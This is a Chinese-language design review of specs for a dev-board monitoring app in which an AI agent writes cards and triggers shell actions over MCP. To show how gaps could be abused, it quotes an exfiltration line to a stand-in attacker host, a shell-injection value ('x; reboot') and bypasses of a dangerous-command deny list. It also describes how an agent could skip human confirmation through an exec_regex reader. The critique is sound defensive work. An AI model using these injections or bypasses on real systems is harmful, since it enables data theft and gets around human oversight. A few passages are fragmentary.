## 0. 结论

**不建议把当前文档集作为实现基线逐节批准。** 主要原因有三个：

1. **评审基线本身不可信**（K-P0-1）。五份契约的头注都写「正文未改动」，提交说明也写「只改了两处表述」，
   但 git 显示迁入之后契约被改了 +956/−187 行，危险地板、agent 授权、MCP 传输与发现这几节都是那次加进来的。
2. **安全承诺没有可执行的机制**（K-P0-2、K-P0-3）。「不准有裸命令」「没有人能绕过人的确认」两句话，
   在「包一律生效 + 参数直接拼进 shell + 地板按自然语言模式匹配 + 授权只绑动作 id」的组合下都不成立。
3. **同一个问题，契约、ADR、设计给出不同答案**：动作分级（K-P1-1）、卡片 API（K-P1-2）、
   状态迁移（K-P1-4）、MCP 传输（K-P0-4）。实现者照哪份写都会和另一份对不上。

两条总线、五态、`unavailable ≠ 0`、sample/tag 双命名空间、poll group、回读闭环这些内核是对的，
本评审没有发现需要推翻它们的理由。问题集中在**机制细节没写到可执行**和**文档之间互相矛盾**。

### K-P0-2 「卡片不能联网」这条承诺没有执行机制 🟢（机制缺失）+ 🔵（Electron 侧待验证）

契约把「网络」写成了沙箱属性：

> 网络｜**默认禁，且 v1 无法申请**。要联网必须升契约版本（spec/03:297）
> 一张 AI 写的卡片，如果能随便联网，它就能把用户板子上的数据发到任何地方（spec/03:305-306）

但整套机制只写了 `<iframe sandbox="allow-scripts">`（spec/03:295，docs/04:246）。
**iframe 的 `sandbox` 属性不限制网络。** 没有 `allow-same-origin` 只是让卡片拿不到宿主的源、DOM 和存储；
卡片在自己的不透明源里照样可以 `fetch('https://attacker/?d='+data)`、`new WebSocket(...)`、
`navigator.sendBeacon(...)`、`<img src>`。要挡住它，必须由宿主在**响应头里注入 CSP**
（`default-src 'none'; script-src 'self'; connect-src 'none'; img-src 'self' data:` 之类），
或者对各自定义协议会话做 `webRequest` 拦截。这两条在全套文档里都没有出现。

后果不是理论上的：卡片的合法输入恰好是板子的遥测（`list_tags`、`sample_tag` 给的就是真实值），
而卡片的作者是 agent。产品模型是「agent 写卡即生效」，所以「一张坏卡能把板子数据发出去」
必须由机制挡住，不能靠卡片自觉。

顺带两处同源问题：

- spec/03:298 承诺卡片可以写「自己的命名空间（布局、偏好）」，但全套文档**没有 `cockpit.storage.*` API**；
  而 docs/04:249 明确「不给 `allow-same-origin`」，这种环境里 `localStorage` 直接抛 `SecurityError`
  （ADR D6 在 docs/05:100 还写着「不能取 cookie/localStorage」，与契约的承诺相反）。
- spec/03:299「文件｜不可读写宿主机文件系统（除布局存储的受控接口）」——那个「受控接口」同样没定义。

**建议**：在 spec/03 §六 增加一节「网络与存储的执行方式」，写死 CSP 策略、`cockpit.storage.*` 的方法签名与配额、
以及「卡片目录内的相对资源可以取，其他一律不行」；docs/04 §6.2 同步。这是**契约级**改动，需要你拍板（T-4）。

### K-P0-3 动作安全链有三处断裂，「没有人能绕过人的确认」不成立 🟢

三处断点彼此独立，任何一处都足以让确认机制形同虚设。

**(a) 参数是原样拼进 shell 的，契约不要求引号也不定义转义。**
spec/02:390-397 把参数说成「声明式的，不是字符串模板里的自由文本」，但 `command` 仍然是字符串模板
（spec/02:367、board.yaml:149、board.yaml:168），`{param}` 直接替换（spec/02:433）。
`backlight.set` 的 `value` 是 integer，所以注入不进去；但 spec/02:365 的动作示例里
`model: {type: string}` 是**字符串参数**，并且被原样拼进
`"/usr/local/bin/pipeline start --model {model} --fps {fps}"`（spec/02:367）。
板子上的会话是 root（`profiles/targets/board-serial.json:10` 的提示符 `root@ATK-DLRK3588`，🟡 本轮未复核权限模型），一条
`--model 'x; reboot'` 就能让「启动管线」变成「重启板子」——而这条命令**不命中地板**，
因为地板的匹配对象是**整条模板命令**（spec/02:477「把命令和地板表对一遍」），
`pipeline start --model {model}` 里没有 `reboot` 字样。
地板表里也没有 `sh -c`、`$(...)`、反引号、`;` 这些真正的执行原语（spec/02:468-475）。

**(b) 地板是「按命令模式匹配」的自然语言表，可绕过。**
表里的 `rm -rf /`、`dd 写到 /dev/mmcblk` 依赖字面写法（spec/02:474）。
`rm -rf /` 的等价形式（`rm -fr /`、`find / -delete`、`cd / && rm -rf *`）只有一句「及其等价形式」，
没有算法；`flash`、`upgrade` 这类词还会误伤 `upgrade_status.sh` 这种只读脚本。
把安全下限建立在一个字符串匹配函数上，需要一个明确的**匹配规范**（词边界、路径规范化、
参数解析、shell 解析）与**失败方向**（匹配不上时按危险处理还是放行）。现在两者都没有。

**(c) 授权粒度是动作 id，不是「动作 + 参数域」。**
spec/03:170 把授权绑定到 `(卡片 id, 动作 id, 板型包 id)`，spec/04:255 说「授权的是『改背光』这件事」。
用户批准「这张卡可以改背光」时，批准的很可能是「亮度 30」这个意图；实际得到的是 `0..255` 全域，
包括把屏幕调到全黑。对 `destructive` 每次二次确认可以兜住，但 `reversible` 门类里
「可逆」并不等于「无害」（把背光调 0、把 governor 设成 powersave，都能让板子看起来死机）。
这一条需要你决定授权粒度（T-3），但它也暴露了契约的一个措辞问题：把 `reversible`
翻译成「可逆，误操作能恢复」会让用户低估风险（spec/02:385）。

**补充（残余风险）**：spec/02:249 的 `exec_regex` 逃生门让板型包可以执行任意命令，
而「包一律生效」（spec/04:307-327）。也就是说 agent 不需要任何动作授权，写一个
`exec_regex` reader 就获得了任意 shell 执行——只是走的是采样侧，不进审计、不触发分级
（spec/03:209 只限制卡片轮询，没限制 reader 的命令）。这不违反字面规则，但违反设计意图。

**建议**：命令模板改成「参数值必须经过类型化编码后注入」（例如所有值一律单引号包裹并转义 `'`，
或干脆改成 argv 数组而不是 shell 字符串）；地板改为「解析后的 argv 序列 + 路径规范化后匹配」，
并定失败方向；授权增加可选参数域；对 `exec_regex`/`script` reader 单独记一条审计事件。

### K-P0-4 MCP 的传输、发现与进程模型三方互相矛盾 🟢

| 来源 | 说法 |
|---|---|
| 契约 spec/04 §7.1–7.2（:439-475） | 「倾向 HTTP + 本地端口」；发现文件 `%LOCALAPPDATA%/DevBoardCockpit/mcp.json` 是「**唯一**的耦合点」；HTTP 的代价是「可能弹防火墙」 |
| 设计 docs/04 §9（:318-322） | 「传输：**stdio**」，两种启动方式，其中包括独立进程 `devboard-cockpit --mcp-stdio` |
| ADR D2（docs/05:30-31） | MCP server **必须与 GUI 同进程**（在 Electron main），否决双层混合 |
| 契约 spec/04:451 | 「具体形态由 `docs/04-架构设计.md` 决定，本契约只要求『agent 能发现并连上』」 |

三方各写一套：契约倾向 HTTP 并给出发现机制，设计选 stdio 并丢掉发现文件，
而「独立进程 `--mcp-stdio`」同时违反 D2（不同进程）和契约（没有发现机制，agent 无从知道它存在）。
更实际的问题是：契约选 HTTP 时**完全没有写安全要求**。MCP 规范对本地 HTTP 传输有明确要求——
校验 `Origin`（不合法回 403）、只绑 `127.0.0.1`、对所有连接做认证；历史上多个本地 MCP server
就是因缺这三条被 DNS rebinding / 跨站请求打穿（见文末来源）。契约给的发现文件里
`port`/`pid` 是明文，如果 agent 能读，本机任何进程也能读——那么「谁能调 `execute_action`」
就成了「谁先连上端口」。

**建议**：先定传输（T-1），再在契约里写死安全基线（Origin 白名单、仅回环、启动时生成的
bearer token 写进发现文件且权限 0600、token 轮换）。如果坚持 stdio，就必须回答
「GUI 已在运行时，agent 怎么发现并连上它」——stdio 天然做不到这一点，这正是契约称其「别扭」的原因。

### K-P1-1 动作分级：三份文档三个答案 🟢

|---|---|---|---|
| 契约 spec/02 §4.2（:381-388） | `reversible` / `destructive`（明确「只读不是动作」） | `danger` | **板型包** |
| 契约 spec/03:230-231 | 卡片**不得**声明 `danger` | — | 板型包 |
| ADR D7（docs/05:105-117） | `read` / `reversible` / `destructive` | `tier` | **卡片 manifest** |
| 设计 docs/04:179-180 | 称契约档位为 `readonly / reversible / destructive` | — | — |
| README:75-76、docs/00:106 | 「三档」 | — | — |

docs/04:179-180 的说法与契约原文相反（契约把只读排除在动作之外），而且 spec/03 的校验规则 11
会把声明了 `danger` 的卡片直接判为非法（spec/03:408）。实现者按 ADR 写会做出被契约校验器拒绝的东西。

可逆写、破坏性写」，字段名统一 `danger`、声明位置统一板型包；README 的 D6/D7 行同步。

### K-P1-2 卡片 API 有两份定义，且方法名不一致 🟢

spec/03 §四（:191-209）与 §七（:320-370）是同一段内容的两份拷贝（`tags.get` / `tags.subscribe` 一字不差），
但两处都缺 `actions.invoke` 的定义，直到 §七.3（:363-370）才出现。而 ADR D6（docs/05:95-96）给的是
另一套名字：`getTag / subscribeTag / setAction / log / notify / listTags`。愿景（docs/00:89）用的是
`execute_action(cardId, …)`。四份材料四种命名。

这是「AI 写卡」的关键接口：agent 照 `get_card_sdk_docs` 写代码，方法名错一个，卡就是死的，
而报错会落在运行时日志里，agent 未必看得懂。**建议**：spec/03 只保留一节，给出完整签名表
（参数、返回、错误码、时序保证），并把 D6 改成引用它，不再列出第二套名字。

### K-P1-3 五态迁移表不完整，且「脏值」的处理自相矛盾 🟢

spec/01 §2.1（:128-144）自称「这张表没有死路」（:148），实际缺这些行：

- `ok → error`（资源在，但这次读出来的值坏了——最常见的解析失败）；
- `stale → pending`（资源回来但需要重建基线，`unavailable → pending` 和 `error → pending` 都写了，唯独 `stale` 没写）；
- `error → stale`（持续失败后进入「保留旧值」语义，`ok → stale` 有，`error` 侧没有）；
- `pending → pending`（第二次采样仍然失败）。

更实质的问题是语义冲突：spec/01:18 说「取值域…越界视为读失败」，但没说读失败落到 `error` 还是 `unavailable`；
spec/01:151 的分界是「资源不在 = unavailable，资源在但读不出来 = error」，于是越界应属 `error`。
可是 `error` 不保留旧值（:159「`unavailable` 和 `error` 不保留（值为 `null`）」），
而 `stale → error` 那一行被解释成「刷新恢复但这次读出来的值坏了」（:140）——这时旧值是有用的，
却被丢掉了。同时 §2.3 的「3× 周期未成功即 stale」（:180）在「连续失败」路径上会把 `error` 重新归类成 `stale`，
等于同一个故障在两个状态间来回跳。

**建议**：补全迁移表；把「值坏了」定义为 `error` + `last_good` 保留（或明确不保留并说明卡片怎么显示）；
在 §2.3 明确「刷新失败」与「超时未刷新」的优先级。

### K-P1-4 主力板绑不上板型包（绑定字段与 id 都错） 🟢

`profiles/targets/board-adb.json:5` 与 `board-serial.json:5` 都写 `"board": "atklrk3588"`。
但板型包的 id 是 `rk3588-atk`（board.yaml:19），`atklrk3588` 这个 id 已在迁入时作废删除
（docs/03:100），且 `profiles/boards/` 下没有任何包叫这个名字。
更麻烦的是字段名：契约 §10 用的是 `board_pack`（spec/02:610），ADR D5 用的是 `board:`（docs/05:82），
而 targets 里也写 `board`。于是无论按契约还是按 ADR，这两条主力连接都绑不上任何包，
只能退回 `match.models` 自动识别；而自动识别要读 `board.model`，读它又需要先绑上包——
一个很具体的死循环（🔵 实现时是否真的会死循环取决于加载顺序，但设计上没有写清顺序）。

**建议**：改 targets 为 `"board_pack": "rk3588-atk"`，并把 D5 的字段名统一；在 spec/02 §10 补一句
「自动识别发生在连接建立后、reader 启动前」的顺序约束。

### K-P1-5 C1「已按实测改」既越权又改错了语义 🟢

docs/06:129 记录 Q1 状态为「**已按实测改**」，理由是原路径不存在（这半句是对的，🟢 docs/06:33）。
但改动把 `npu_devfreq` 从「读频率」变成了「读 `fdab0000.npu/load`」，而该文件是 `<duty>@<freq>Hz`，
duty 是**占空比**（docs/02:85 明确写了）。于是包里出现了这样的绑定：

```yaml
# board.yaml:188-199
kind: devfreq_load
args: {path: /sys/class/devfreq/fdab0000.npu/load, measure: duty_cycle}
provides:
  - {tag: custom.rk3588-atk.npu.duty,    sample: duty}
  - {tag: custom.rk3588-atk.npu.freq_hz, sample: freq_hz}
```

问题有三层：

1. **流程**：项目自己的规矩是「契约与实测的差异不私自改包，一律记进 docs/06 由用户拍板」
   （docs/03:147、docs/06:5、profiles/boards/README.md:12-13）。这是唯一一次自我豁免。
2. **语义**：`load` 里的 `@<freq>Hz` 是「这条 duty 是在哪个频率上测的」，不是「此刻的频率」。
   契约 C1 要的是「当前频率」，更贴切的来源是 `/sys/kernel/debug/rknpu/freq`（docs/02:86）
   或 `fdab0000.npu/cur_freq`。另外 `custom.rk3588-atk.npu.freq_hz` 这个名字与
   `gpu.freq_hz` 的语义（「当前工作频率」）撞车，读的人会以为它是实时的（🔵 两处读数在
   变频时是否一致，本轮无法验证）。
3. **时延**：`npu_devfreq` 挂在 `rare` 组，30 秒一次（board.yaml:57）。于是
   `custom.rk3588-atk.npu.freq_hz` 每 30 秒才更新一次，而名字暗示它是「当前」。

**建议**：回滚这一条，按 T-6 重新拍板；若保留，把频率拆到 `fast` 组或改用 `cur_freq`，
并在 docs/06 里把「已改」改成「候选 A 已实施，待追认」。

### K-P1-6 连接 profile 没有 schema，字段语义靠猜 🟢

四个 target 的 `options` 各写各的：`commands`（"adb"/"serial"/"ssh"）、`serial`（序列号）、
`port`/`baudrate`、`host`/`port`/`username`、`prompt`、`pty`。这些字段**没有一处定义**，
也没有 schema 校验。至少三处直接冲突事实清单：

- `board-adb.json:7` 写 `"pty": false`（符合事实 A1「不要用 PTY」），`board-serial.json:9` 写 `"pty": true`，
  `local.json`/`ubuntu-ssh.json` 也 `true`——但「pty 在 ADB 上为 true 会发生什么」没有规定；
- `board-adb.json:9` 的 `"commands": "adb"` 含义不明（是命令名？是快捷命令集？）；
- `board-serial.json:8` 用 `baudrate`，而旧工程与事实清单用的是 `baud`/`波特`。

docs/01:63 已经把「用户手改 JSON 无 schema 校验」列为旧工程的技术债，新工程号称要修（docs/03:20），
但 schema 不存在。**建议**：给 `profiles/targets/*.json` 定 schema（含每个 transport 的 options 子 schema），
并把它列为 M0 的验收项；`serial` 与 `prompt` 这种「怎么画提示符」属于 UI 偏好，移进 `settings`。

### K-P1-7 `verify`、`format`、`type`、`enum`、`tolerance` 都是悬空引用 🟢

- `verify`：校验规则 15 说「必须有 `readback` 或 `verify`」（spec/02:546），但全文**没有定义 `verify`**。
- `format`：`file_read` 的参数里有 `format`（spec/02:247），示例用 `integer`/`string`/`float`/`json`
  （:297、board.yaml:133、spec/02:313、:331），但没有枚举表，也没说非法值怎么办。
- `type`：动作参数的 `type` 只出现过 `integer`/`string`/`enum`/`boolean`（spec/02:396、:365-366、board.yaml:161、spec/03:223），
  没有 `number`、没有数组、没有默认单位。
- `enum.values`：board.yaml:161-162 用了 `values`，spec/02 的参数一节（:390-397）没写这个键。
- `tolerance`：只在示例里出现（spec/02:123、:420），没定义单位与比较规则（绝对差？相对差？）。

这些不是文字问题：校验器要实现它们，卡片要依赖它们，agent 要照它们写包。

### K-P1-8 命令模板与参数约束不闭合（与 P0-3 同一根因的契约面） 🟢

除了注入，还有三个具体缺口：

1. 规则 13 只在 `command` 与 `readback.path` 里扫 `{param}`（spec/02:544），
   但 §4.4 说 `{param}` 在 `command` 和 `readback.path` 都允许（:433）——**`readback.expect` 呢？**
   示例里恰好用了 `expect: "{value}"`（:419、board.yaml:153），却没进规则。
2. 规则 13/14 的「死参数」判定只看字面出现（spec/02:544-545），`{cpu}` 出现在路径里就算用过，
   但 `cpu` 的取值域（0..7）与路径实际存在的节点数（8 核）没有任何校验。
3. 参数没有「编码方式」字段。同是 `integer`，`echo {value} > file` 与
   `printf '%d' {value}` 的安全性不同；契约无法表达「这个参数必须按 shell 单引号编码」。

### K-P1-9 `command_ok` 回读与「以回读为准」矛盾，且在串口上必然假成功 🟢

spec/03:256 说「回读是强制的……UI 以回读到的真实状态为准」，spec/02:425 却允许
`readback: {kind: command_ok}`——「命令本身返回 0」。在 ADB 上这只是弱证据；在串口上它是**无证据**：
事实 S5 明说串口拿不到 exit status，「有文本回包 = 0，超时 = 124」（docs/02:136）。
于是同一个包走串口时，任何动作都会「回读成功」。

**建议**：把 `command_ok` 限制为「非串口传输可用」，或在回读结果里带上 `confidence`，
并规定串口上必须用 `tag` / `file_equals` 形式；`destructive` 动作禁止 `command_ok`（现在只禁止「没有 readback」）。

### K-P1-10 串口上「采样」和「动作」抢同一根线，契约没有仲裁规则 🟢

事实 S1「命令通道和交互终端共用一根线，一个读线程 + 一份 transcript，命令靠 marker 认领回包」、
S2「板子会回显命令，marker 出现两次」（docs/02:132-133）。而契约规定 poll group 每秒一次往返（spec/02:171-175），
动作是另一次往返（spec/03:249）。两者同时发生时，poll group 的 marker 回包和动作的回包会在
同一条 transcript 里交错——**契约没有任何一句规定串行化、队列、优先级或超时后的清理**。
docs/04 §5.1（:196-199）只写了「合并成一条命令」和「串口压平」，没写并发。

这条会直接表现为「串口上点了按钮，监控卡数值乱跳/串台」——正是事实清单里记过的坑。
**建议**：在 spec/02 §1.2 或新建一节写「一次往返的互斥」：同一连接上所有往返串行，
动作优先于 poll，动作超时后必须等到 marker 收齐或明确放弃该 marker。

### K-P1-11 卡片「视图内动作」的字段没定义，且与授权规则冲突 🟢

spec/03 §二 的逐字段表（:48-61）只列了 `actions` 一项，没写 `actions[]` 里有什么；
§五.1 给出的示例（:217-226）用了 `id` / `label` / `target` / `params`，其中 `target` 不在任何字段表里。
同时 §5.4 的表格（:276-285）说视图内动作「不碰板子，不需要授权」，
而校验规则 7 要求 `actions[].target` 必须在 `permissions.write` 里（spec/03:404）——
于是「视图内动作」被当成板型动作来校验，`target` 还必须授权。三处互相打架。

**建议**：把 `actions[]` 拆成两个列表（`view_actions` 与 `board_actions`），分别定义字段与校验；
或保留一个列表但加 `kind: view | board`，规则 7 只对 `board` 生效。

### K-P1-12 「schema 封闭」需要一份真正的 JSON Schema，现在只有一段示例 🟢

D10（spec/00:97）与 spec/03 §2.5（:105-127）承诺每一层封闭，但给的是散文 + 一个反例
（`"network": true`）。要执行「未知字段报错」，实现层需要一份可校验的 schema，
而契约没有规定顶层允许哪些键（例如 `description` 在示例里有、逐字段表里没有）。同样的
`profiles/*.json`、`board.yaml`、MCP 返回体（spec/04:399-405）都缺 schema。

**建议**：把 schema 作为契约的一部分（JSON Schema 或 TS 类型文件），与文档同版本；
校验器从 schema 生成，而不是手写 if/else。

### K-P1-13 两个核心 tag 的语义会让仪表说谎 🟢

- `mem.used_bytes` 定义为「MemTotal − MemAvailable，**含可回收 page cache**」（spec/01:60）。
  MemTotal − MemAvailable 恰恰是**不含**可回收部分的口径；把 page cache 说成「含」会让
  卡片作者以为这个数会偏高，而实际它是最保守的可用性口径。更要紧的是没有 `mem.available_bytes`，
  而「内存还剩多少」是监控卡最常问的问题。建议改成
  `mem.used_bytes`（MemTotal − MemFree − Buffers − Cached，即传统口径）+
  `mem.available_bytes`（MemAvailable），两者语义都写死。
- `npu.usage` 定义是「各核利用率的最大值」（spec/01:57）。这条本身对，但板型包同时提供了
  `npu.core.*.usage` 和占空比对照量（board.yaml:94-98、:195-198）。最大值语义在「3 核里 1 核满载」
  时显示 100%，会让人以为整个 NPU 满载；对照量存在但不在核心词表里，卡片作者大概率只读 `npu.usage`。
  建议在语义栏里补一句「这是核间最大值，不是整芯片平均负载」，或在词表里加 `npu.usage_avg`。

### K-P1-14 词表里有一批「有定义、无实现」的 tag 🟢

`board.kernel`（spec/01:66）在板型包里没有 reader；`disk.*`（:70-71）、`net.*`（:68-69）同样没有
（docs/06:160-161 已自己记下）；`backlight.brightness`（:67）在词表里，但板型包**没有**提供这个 tag，
只有 `backlight.set` 动作（board.yaml:141-154）——也就是说「回读」只能靠 `file_equals`，
卡片读不到当前亮度。于是「词表 = 能力清单」这个期待落空，agent 用 `list_tags()` 会发现
一半的核心词没有实例。

**建议**：词表加一列「本包是否提供」（或每个包在 README 里给矩阵）；把 `backlight.brightness`
的 reader 补进板型包（它本来就在 `custom` 的逃生门示例里出现过，spec/02:292-301）。

### K-P1-15 「唯一权威」有三套互不兼容的机制 🟢

- spec/00:79-80：「契约的机器可读形态由实现层生成……**同改两处**（契约文档 / 实现层），另加板型包算三处」；
- AGENTS.md:56：「对拍是硬判据，TS 实现必须跑通与契约同源的**黄金样本断言**」；
- docs/04:161-173：「实现层里的词表、kind 表、校验规则都要能从 `docs/spec/` **生成或逐条核对**」。

三者对「什么算对齐」的定义不同：同改两处是人工纪律，黄金样本是行为等价，生成是结构同源。
M3 的验收判据又写「跑通 Python 参考的同批断言」（docs/04:447）——而那份参考实现已被移除
（docs/03:98、docs/05:203-229），所以 M3 按现在的写法**无法验收**。

**建议**：定一种机制（推荐「生成 + 逐条核对」，因为可自动化），把另外两种降为补充；
M3 的判据改成「生成的词表/kind 表/规则表与文档逐条相等 + 黄金样本通过」。

### K-P1-16 「从 Markdown 表格生成」在工程上不成立，除非先定可机器读的载体 🟢

spec/01:82-86 要求实现层从「这一张表」生成词表，spec/04 的工具也要从文档生成。
但它们是 Markdown 表格：单元格里含 `|`（如 `disk.*.free_bytes` 的说明）、含反引号、
列顺序靠人维护。用正则去解析这种表格生成 TS 类型，是很脆的（改一个空格就静默错位）。
docs/04:139 还把它落到 `src/shared/tag-vocabulary.ts`，而 docs/04:116 的目录树里写的是
`src/main/tags/vocabulary.ts`——生成脚本的输入输出路径本身就有两个版本。

**建议**：把权威数据放进一个显式的机器可读块（YAML/JSON 代码块，或 `spec/data/*.yaml`），
Markdown 表格由它渲染；文档与代码都从这一份生成。这样「唯一权威」才是可执行的。

对所有连接认证，并说明 Streamable HTTP 取代了旧的 HTTP+SSE；已有多起本地 MCP server
因缺 Host/Origin 校验被 DNS rebinding 打穿（见来源）。
